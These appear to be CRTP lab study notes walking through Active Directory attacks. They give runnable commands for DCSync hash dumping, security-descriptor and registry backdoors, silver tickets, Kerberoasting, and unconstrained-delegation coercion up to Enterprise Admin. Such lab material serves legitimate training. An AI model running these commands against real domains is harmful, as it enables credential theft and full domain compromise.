# CRTP – DCSync Rights, Security Descriptor Abuse, Kerberoasting & Unconstrained Delegation

---

# 1. DCSync Rights

## Objective

Grant **DCSync (Replication)** rights to `studentx` and use those rights to retrieve the password hashes of any domain account (especially `krbtgt`).

---

## Step 1 – Check Existing Replication Rights

Start InviShell and import PowerView.

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PowerView\PowerView.ps1
```

Check whether `studentx` already has replication rights.

```powershell
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs |
?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} |
ForEach-Object {
    $_ | Add-Member NoteProperty IdentityName $(Convert-SidToName $_.SecurityIdentifier)
    $_
} |
?{$_.IdentityName -match "studentx"}
```

### Purpose

This command checks whether **studentx** already has:

- DS-Replication-Get-Changes
- DS-Replication-Get-Changes-All
- GenericAll

These permissions are required for a DCSync attack.

---

# Step 2 – Obtain a Privileged TGT

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### Purpose

Obtains a Kerberos TGT for **svcadmin**, which has permissions to modify ACLs.

---

# Step 3 – Grant DCSync Rights

Start an elevated InviShell.

```powershell
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat

. C:\AD\Tools\PowerView\PowerView.ps1
```

Grant replication rights.

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=dollarcorp,DC=moneycorp,DC=local" `
-PrincipalIdentity studentx `
-Rights DCSync `
-PrincipalDomain dollarcorp.moneycorp.local `
-TargetDomain dollarcorp.moneycorp.local `
-Verbose
```

### Result

`studentx` can now perform Active Directory replication.

---

# Step 4 – Verify Again

Run the ACL enumeration command again.

Expected:

```
studentx
```

should now appear with replication rights.

---

# Step 5 – Execute DCSync

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

### Result

Retrieve:

- NTLM Hash
- AES Keys
- Kerberos Keys

for the **krbtgt** account.

---

## Attack Flow

```
Compromise Privileged Account
            │
            ▼
Grant DCSync Rights
            │
            ▼
Verify ACL
            │
            ▼
Run DCSync
            │
            ▼
Retrieve krbtgt Hash
```

---

# 2. Modifying Security Descriptors

## Objective

Allow `studentx` to use:

- WMI
- PowerShell Remoting

without Domain Admin privileges.

---

## Configure WMI

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\RACE.ps1

Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace root\cimv2 -Verbose
```

Verify:

```powershell
Get-WmiObject Win32_OperatingSystem -ComputerName dcorp-dc
```

---

## Configure PowerShell Remoting

```powershell
Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

Verify:

```powershell
Invoke-Command -ScriptBlock {$env:USERNAME} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

Expected:

```
studentx
```

---

# 3. Retrieve Machine Account Hash

## Add Remote Registry Backdoor

```powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
```

Retrieve the machine account hash.

```powershell
. C:\AD\Tools\RACE.ps1

Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

---

# Silver Ticket using Machine Account

Create HOST ticket.

```powershell
Rubeus evasive-silver /service:host ...
```

Create RPCSS ticket.

```powershell
Rubeus evasive-silver /service:rpcss ...
```

Verify:

```powershell
klist
```

Execute WMI.

```powershell
Get-WmiObject Win32_OperatingSystem -ComputerName dcorp-dc
```

---

# Attack Flow

```
Retrieve Machine Hash
         │
         ▼
Forge HOST Ticket
         │
         ▼
Forge RPCSS Ticket
         │
         ▼
Authenticate to WMI
```

---

# 4. Kerberoasting

## Enumerate SPN Accounts

```powershell
Get-DomainUser -SPN
```

Expected:

```
svcadmin
```

---

## Request Service Ticket

```powershell
Rubeus kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

---

## Crack the Hash

Remove

```
:1433
```

from the MSSQL SPN.

Run John.

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

---

## Kerberoasting Flow

```
Find SPN
     │
     ▼
Request TGS
     │
     ▼
Export Hash
     │
     ▼
Offline Crack
```

---

# 5. Unconstrained Delegation

## Find Delegated Systems

```powershell
Get-DomainComputer -Unconstrained
```

---

## Obtain TGT

```powershell
Rubeus asktgt /user:appadmin ...
```

---

## Find Local Admin Access

```powershell
Find-PSRemotingLocalAdminAccess
```

---

## Compromise Delegated Server

Copy Loader.

```cmd
xcopy Loader.exe \\dcorp-appsrv\C$\Users\Public\
```

Start WinRS.

```cmd
winrs -r:dcorp-appsrv cmd
```

Configure port proxy.

```cmd
netsh interface portproxy add ...
```

Start monitoring.

```powershell
Rubeus monitor /targetuser:DCORP-DC$
```

---

# Authentication Coercion

## Printer Bug

```powershell
MS-RPRN.exe \\dcorp-dc \\dcorp-appsrv
```

---

## Windows Search Protocol

```powershell
WSPCoerce.exe DCORP-DC DCORP-APPSRV
```

---

## DFSCoerce

```powershell
DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```

---

# Inject Captured Ticket

```powershell
Rubeus ptt /ticket:<Base64Ticket>
```

Execute DCSync.

```powershell
SafetyKatz "lsadump::evasive-dcsync /user:dcorp\krbtgt"
```

---

# Enterprise Admin Escalation

Monitor:

```powershell
Rubeus monitor /targetuser:MCORP-DC$
```

Trigger Printer Bug.

```powershell
MS-RPRN.exe \\mcorp-dc \\dcorp-appsrv
```

Or use:

```powershell
DFSCoerce
```

or

```powershell
WSPCoerce
```

Inject the captured ticket.

```powershell
Rubeus ptt /ticket:<Ticket>
```

Run DCSync.

```powershell
SafetyKatz "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local"
```

Result:

```
Enterprise Admin compromise
```

---

# Summary

| Technique | Goal |
|-----------|------|
| DCSync | Dump domain password hashes |
| Security Descriptor Abuse | Enable WMI & PS Remoting |
| Silver Ticket | Authenticate to HOST/RPCSS services |
| Kerberoasting | Crack service account passwords |
| Unconstrained Delegation | Steal TGTs from privileged users |
| PrinterBug / WSPCoerce / DFSCoerce | Force authentication to delegated server |
| Enterprise Admin Escalation | DCSync against parent domain |

---

# Important CRTP Notes

- **DCSync** requires replication rights (`DS-Replication-Get-Changes*`).
- **Silver Tickets** require the target service account (or machine account) hash.
- **Kerberoasting** only targets accounts with SPNs.
- **Unconstrained Delegation** stores users' TGTs in LSASS on the delegated server.
- **PrinterBug**, **WSPCoerce**, and **DFSCoerce** force privileged machines to authenticate, allowing their TGTs to be captured.
- After obtaining the **krbtgt** hash, the environment is effectively fully compromised because it enables further Kerberos ticket forgery attacks.
